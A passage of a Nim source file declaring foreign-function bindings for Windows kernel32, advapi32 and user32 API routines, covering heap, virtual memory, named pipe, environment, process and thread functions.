importc.}proc HeapFree*(hHeap: HANDLE, dwFlags: DWORD, lpMem: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapSize*(hHeap: HANDLE, dwFlags: DWORD, lpMem: LPCVOID): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessHeap*(): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetOverlappedResult*(hFile: HANDLE, lpOverlapped: LPOVERLAPPED, lpNumberOfBytesTransferred: LPDWORD, bWait: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateIoCompletionPort*(FileHandle: HANDLE, ExistingCompletionPort: HANDLE, CompletionKey: ULONG_PTR, NumberOfConcurrentThreads: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetQueuedCompletionStatus*(CompletionPort: HANDLE, lpNumberOfBytesTransferred: LPDWORD, lpCompletionKey: PULONG_PTR, lpOverlapped: ptr LPOVERLAPPED, dwMilliseconds: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc PostQueuedCompletionStatus*(CompletionPort: HANDLE, dwNumberOfBytesTransferred: DWORD, dwCompletionKey: ULONG_PTR, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeviceIoControl*(hDevice: HANDLE, dwIoControlCode: DWORD, lpInBuffer: LPVOID, nInBufferSize: DWORD, lpOutBuffer: LPVOID, nOutBufferSize: DWORD, lpBytesReturned: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelIo*(hFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetQueuedCompletionStatusEx*(CompletionPort: HANDLE, lpCompletionPortEntries: LPOVERLAPPED_ENTRY, ulCount: ULONG, ulNumEntriesRemoved: PULONG, dwMilliseconds: DWORD, fAlertable: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelIoEx*(hFile: HANDLE, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelSynchronousIo*(hThread: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetOverlappedResultEx*(hFile: HANDLE, lpOverlapped: LPOVERLAPPED, lpNumberOfBytesTransferred: LPDWORD, dwMilliseconds: DWORD, bAlertable: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeSListHead*(ListHead: PSLIST_HEADER): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc InterlockedPopEntrySList*(ListHead: PSLIST_HEADER): PSLIST_ENTRY {.winapi, stdcall, dynlib: "kernel32", importc.}proc InterlockedPushEntrySList*(ListHead: PSLIST_HEADER, ListEntry: PSLIST_ENTRY): PSLIST_ENTRY {.winapi, stdcall, dynlib: "kernel32", importc.}proc InterlockedFlushSList*(ListHead: PSLIST_HEADER): PSLIST_ENTRY {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryDepthSList*(ListHead: PSLIST_HEADER): USHORT {.winapi, stdcall, dynlib: "kernel32", importc.}proc InterlockedPushListSListEx*(ListHead: PSLIST_HEADER, List: PSLIST_ENTRY, ListEnd: PSLIST_ENTRY, Count: ULONG): PSLIST_ENTRY {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsProcessInJob*(ProcessHandle: HANDLE, JobHandle: HANDLE, Result: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindResourceExW*(hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, wLanguage: WORD): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeLibraryAndExitThread*(hLibModule: HMODULE, dwExitCode: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeResource*(hResData: HGLOBAL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetModuleFileNameA*(hModule: HMODULE, lpFilename: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetModuleFileNameW*(hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetModuleHandleA*(lpModuleName: LPCSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetModuleHandleW*(lpModuleName: LPCWSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadLibraryExA*(lpLibFileName: LPCSTR, hFile: HANDLE, dwFlags: DWORD): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadLibraryExW*(lpLibFileName: LPCWSTR, hFile: HANDLE, dwFlags: DWORD): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadResource*(hModule: HMODULE, hResInfo: HRSRC): HGLOBAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadStringA*(hInstance: HINSTANCE, uID: UINT, lpBuffer: LPSTR, cchBufferMax: int32): int32 {.winapi, stdcall, dynlib: "user32", importc.}proc LoadStringW*(hInstance: HINSTANCE, uID: UINT, lpBuffer: LPWSTR, cchBufferMax: int32): int32 {.winapi, stdcall, dynlib: "user32", importc.}proc LockResource*(hResData: HGLOBAL): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SizeofResource*(hModule: HMODULE, hResInfo: HRSRC): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddDllDirectory*(NewDirectory: PCWSTR): DLL_DIRECTORY_COOKIE {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveDllDirectory*(Cookie: DLL_DIRECTORY_COOKIE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetDefaultDllDirectories*(DirectoryFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetModuleHandleExA*(dwFlags: DWORD, lpModuleName: LPCSTR, phModule: ptr HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetModuleHandleExW*(dwFlags: DWORD, lpModuleName: LPCWSTR, phModule: ptr HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceLanguagesA*(hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, lpEnumFunc: ENUMRESLANGPROCA, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceLanguagesW*(hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, lpEnumFunc: ENUMRESLANGPROCW, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceLanguagesExA*(hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, lpEnumFunc: ENUMRESLANGPROCA, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceLanguagesExW*(hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, lpEnumFunc: ENUMRESLANGPROCW, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceNamesExA*(hModule: HMODULE, lpType: LPCSTR, lpEnumFunc: ENUMRESNAMEPROCA, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceNamesExW*(hModule: HMODULE, lpType: LPCWSTR, lpEnumFunc: ENUMRESNAMEPROCW, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceTypesExA*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCA, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceTypesExW*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCW, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DisableThreadLibraryCalls*(hLibModule: HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeLibrary*(hLibModule: HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcAddress*(hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindStringOrdinal*(dwFindStringOrdinalFlags: DWORD, lpStringSource: LPCWSTR, cchSource: int32, lpStringValue: LPCWSTR, cchValue: int32, bIgnoreCase: WINBOOL): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualQuery*(lpAddress: LPCVOID, lpBuffer: PMEMORY_BASIC_INFORMATION, dwLength: SIZE_T): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlushViewOfFile*(lpBaseAddress: LPCVOID, dwNumberOfBytesToFlush: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnmapViewOfFile*(lpBaseAddress: LPCVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileMappingFromApp*(hFile: HANDLE, SecurityAttributes: PSECURITY_ATTRIBUTES, PageProtection: ULONG, MaximumSize: ULONG64, Name: PCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc MapViewOfFileFromApp*(hFileMappingObject: HANDLE, DesiredAccess: ULONG, FileOffset: ULONG64, NumberOfBytesToMap: SIZE_T): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualAlloc*(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualFree*(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualProtect*(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualAllocEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualFreeEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualProtectEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualQueryEx*(hProcess: HANDLE, lpAddress: LPCVOID, lpBuffer: PMEMORY_BASIC_INFORMATION, dwLength: SIZE_T): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReadProcessMemory*(hProcess: HANDLE, lpBaseAddress: LPCVOID, lpBuffer: LPVOID, nSize: SIZE_T, lpNumberOfBytesRead: ptr SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteProcessMemory*(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileMappingW*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenFileMappingW*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc MapViewOfFile*(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc MapViewOfFileEx*(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T, lpBaseAddress: LPVOID): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLargePageMinimum*(): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessWorkingSetSizeEx*(hProcess: HANDLE, lpMinimumWorkingSetSize: PSIZE_T, lpMaximumWorkingSetSize: PSIZE_T, Flags: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessWorkingSetSizeEx*(hProcess: HANDLE, dwMinimumWorkingSetSize: SIZE_T, dwMaximumWorkingSetSize: SIZE_T, Flags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualLock*(lpAddress: LPVOID, dwSize: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualUnlock*(lpAddress: LPVOID, dwSize: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetWriteWatch*(dwFlags: DWORD, lpBaseAddress: PVOID, dwRegionSize: SIZE_T, lpAddresses: ptr PVOID, lpdwCount: ptr ULONG_PTR, lpdwGranularity: LPDWORD): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc ResetWriteWatch*(lpBaseAddress: LPVOID, dwRegionSize: SIZE_T): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMemoryResourceNotification*(NotificationType: MEMORY_RESOURCE_NOTIFICATION_TYPE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryMemoryResourceNotification*(ResourceNotificationHandle: HANDLE, ResourceState: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemFileCacheSize*(lpMinimumFileCacheSize: PSIZE_T, lpMaximumFileCacheSize: PSIZE_T, lpFlags: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetSystemFileCacheSize*(MinimumFileCacheSize: SIZE_T, MaximumFileCacheSize: SIZE_T, Flags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileMappingNumaW*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR, nndPreferred: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc PrefetchVirtualMemory*(hProcess: HANDLE, NumberOfEntries: ULONG_PTR, VirtualAddresses: PWIN32_MEMORY_RANGE_ENTRY, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnmapViewOfFileEx*(BaseAddress: PVOID, UnmapFlags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DiscardVirtualMemory*(VirtualAddress: PVOID, Size: SIZE_T): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc OfferVirtualMemory*(VirtualAddress: PVOID, Size: SIZE_T, Priority: OFFER_PRIORITY): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReclaimVirtualMemory*(VirtualAddress: PVOID, Size: SIZE_T): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ImpersonateNamedPipeClient*(hNamedPipe: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreatePipe*(hReadPipe: PHANDLE, hWritePipe: PHANDLE, lpPipeAttributes: LPSECURITY_ATTRIBUTES, nSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ConnectNamedPipe*(hNamedPipe: HANDLE, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DisconnectNamedPipe*(hNamedPipe: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetNamedPipeHandleState*(hNamedPipe: HANDLE, lpMode: LPDWORD, lpMaxCollectionCount: LPDWORD, lpCollectDataTimeout: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc PeekNamedPipe*(hNamedPipe: HANDLE, lpBuffer: LPVOID, nBufferSize: DWORD, lpBytesRead: LPDWORD, lpTotalBytesAvail: LPDWORD, lpBytesLeftThisMessage: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TransactNamedPipe*(hNamedPipe: HANDLE, lpInBuffer: LPVOID, nInBufferSize: DWORD, lpOutBuffer: LPVOID, nOutBufferSize: DWORD, lpBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateNamedPipeW*(lpName: LPCWSTR, dwOpenMode: DWORD, dwPipeMode: DWORD, nMaxInstances: DWORD, nOutBufferSize: DWORD, nInBufferSize: DWORD, nDefaultTimeOut: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitNamedPipeW*(lpNamedPipeName: LPCWSTR, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeClientComputerNameW*(Pipe: HANDLE, ClientComputerName: LPWSTR, ClientComputerNameLength: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreatePrivateNamespaceW*(lpPrivateNamespaceAttributes: LPSECURITY_ATTRIBUTES, lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenPrivateNamespaceW*(lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc ClosePrivateNamespace*(Handle: HANDLE, Flags: ULONG): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateBoundaryDescriptorW*(Name: LPCWSTR, Flags: ULONG): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddSIDToBoundaryDescriptor*(BoundaryDescriptor: ptr HANDLE, RequiredSid: PSID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteBoundaryDescriptor*(BoundaryDescriptor: HANDLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetEnvironmentStringsA*(): LPCH {.winapi, stdcall, dynlib: "kernel32", importc: "GetEnvironmentStrings".}proc GetEnvironmentStringsW*(): LPWCH {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEnvironmentStringsW*(NewEnvironment: LPWCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeEnvironmentStringsA*(penv: LPCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeEnvironmentStringsW*(penv: LPWCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetStdHandle*(nStdHandle: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetStdHandle*(nStdHandle: DWORD, hHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetStdHandleEx*(nStdHandle: DWORD, hHandle: HANDLE, phPrevValue: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommandLineA*(): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommandLineW*(): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetEnvironmentVariableA*(lpName: LPCSTR, lpBuffer: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetEnvironmentVariableW*(lpName: LPCWSTR, lpBuffer: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEnvironmentVariableA*(lpName: LPCSTR, lpValue: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEnvironmentVariableW*(lpName: LPCWSTR, lpValue: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ExpandEnvironmentStringsA*(lpSrc: LPCSTR, lpDst: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ExpandEnvironmentStringsW*(lpSrc: LPCWSTR, lpDst: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCurrentDirectoryA*(lpPathName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCurrentDirectoryW*(lpPathName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentDirectoryA*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentDirectoryW*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SearchPathW*(lpPath: LPCWSTR, lpFileName: LPCWSTR, lpExtension: LPCWSTR, nBufferLength: DWORD, lpBuffer: LPWSTR, lpFilePart: ptr LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SearchPathA*(lpPath: LPCSTR, lpFileName: LPCSTR, lpExtension: LPCSTR, nBufferLength: DWORD, lpBuffer: LPSTR, lpFilePart: ptr LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc NeedCurrentDirectoryForExePathA*(ExeName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc NeedCurrentDirectoryForExePathW*(ExeName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueueUserAPC*(pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessTimes*(hProcess: HANDLE, lpCreationTime: LPFILETIME, lpExitTime: LPFILETIME, lpKernelTime: LPFILETIME, lpUserTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ExitProcess*(uExitCode: UINT): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc TerminateProcess*(hProcess: HANDLE, uExitCode: UINT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetExitCodeProcess*(hProcess: HANDLE, lpExitCode: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SwitchToThread*(): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateRemoteThread*(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenThread*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwThreadId: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadPriorityBoost*(hThread: HANDLE, bDisablePriorityBoost: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadPriorityBoost*(hThread: HANDLE, pDisablePriorityBoost: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TerminateThread*(hThread: HANDLE, dwExitCode: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessShutdownParameters*(dwLevel: DWORD, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessVersion*(ProcessId: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetStartupInfoW*(lpStartupInfo: LPSTARTUPINFOW): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadToken*(Thread: PHANDLE, Token: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenProcessToken*(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenThreadToken*(ThreadHandle: HANDLE, DesiredAccess: DWORD, OpenAsSelf: WINBOOL, TokenHandle: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetPriorityClass*(hProcess: HANDLE, dwPriorityClass: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadStackGuarantee*(StackSizeInBytes: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPriorityClass*(hProcess: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ProcessIdToSessionId*(dwProcessId: DWORD, pSessionId: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessId*(Process: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadId*(Thread: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateRemoteThreadEx*(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID, dwCreationFlags: DWORD, lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, lpThreadId: LPDWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadContext*(hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadContext*(hThread: HANDLE, lpContext: ptr CONTEXT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlushInstructionCache*(hProcess: HANDLE, lpBaseAddress: LPCVOID, dwSize: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadTimes*(hThread: HANDLE, lpCreationTime: LPFILETIME, lpExitTime: LPFILETIME, lpKernelTime: LPFILETIME, lpUserTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenProcess*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessHandleCount*(hProcess: HANDLE, pdwHandleCount: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentProcessorNumber*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateProcessA*(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateProcessW*(lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR, lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateProcessAsUserW*(hToken: HANDLE, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR, lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetProcessIdOfThread*(Thread: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeProcThreadAttributeList*(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, dwAttributeCount: DWORD, dwFlags: DWORD, lpSize: PSIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteProcThreadAttributeList*(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessAffinityUpdateMode*(hProcess: HANDLE, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryProcessAffinityUpdateMode*(hProcess: HANDLE, lpdwFlags: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UpdateProcThreadAttribute*(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, dwFlags: DWORD, Attribute: DWORD_PTR, lpValue: PVOID, cbSize: SIZE_T, lpPreviousValue: PVOID, lpReturnSize: PSIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadIdealProcessorEx*(hThread: HANDLE, lpIdealProcessor: PPROCESSOR_NUMBER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentProcessorNumberEx*(ProcNumber: PPROCESSOR_NUMBER): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentThreadStackLimits*(LowLimit: PULONG_PTR, HighLimit: PULONG_PTR): VOID {.winapi, stdcall, 